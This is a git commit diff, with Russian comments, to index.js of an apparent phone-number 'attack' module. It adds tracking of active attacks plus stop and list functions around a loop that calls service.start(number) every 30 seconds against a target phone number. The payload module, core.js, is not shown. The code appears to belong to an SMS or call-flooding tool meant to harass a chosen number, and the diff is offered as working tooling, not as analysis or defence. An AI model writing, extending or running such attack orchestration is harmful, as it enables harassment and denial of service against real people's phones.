3e81fa9eedc54c198656593ce31a104aad58e8ac
Nikita <belarussianhax@yandex.ru>
2020-12-17 13:51:35 +0300

    Новый метод list(number)

--- index.js
+++ index.js
@@ -1,6 +1,12 @@
 const service = require("./core.js")
-var current_attacks = {};
+var current_attacks = [];
+var list_attacks = [];
 
+/* 
+Иницилизация атаки
+    - number - номер телефона без знака "+" (Например: 79865329543)
+    - loop - количество повторов цикла атаки
+*/
 module.exports.attack = function(number, loop){
     if(!Number(number) || number.toString().length < 11){
             result = {
@@ -22,17 +28,28 @@ module.exports.attack = function(number, loop){
         }
     count = 0;
 
+    list_attacks.push({number: number, startedAt: Date.now()})
+
     current_attacks[number] = setInterval(async function(){
         service.start(number)
                 count++;
                     if(count == loop){
                         clearInterval(current_attacks[number]);
+                        for(let key in list_attacks){
+                            if(list_attacks[key].number == number){
+                                list_attacks.splice(key, 1);
+                            }
+                        }
                     }
         }, 30000);
     }
     return result;
 }
 
+/*
+Остановка атаки
+    - number - номер телефона без знака "+" (Например: 79865329543)
+*/
 module.exports.stop = function(number){
     if(current_attacks[number]){
         clearInterval(current_attacks[number])
@@ -45,6 +62,25 @@ module.exports.stop = function(number){
         result = {
             success: false,
             text: `Нет активных атак по номеру ${number}`
+        }
+    return result
+    }
+}
+
+/* 
+Возвращает список активных атак
+*/
+module.exports.list = function(){
+    if(list_attacks.length === 0){
+        result = {
+            success: false,
+            text: `Список активных атак пуст`
+        }
+    return result
+    }else{
+        result = {
+            success: true,
+            result: list_attacks
         }
     return result
     }
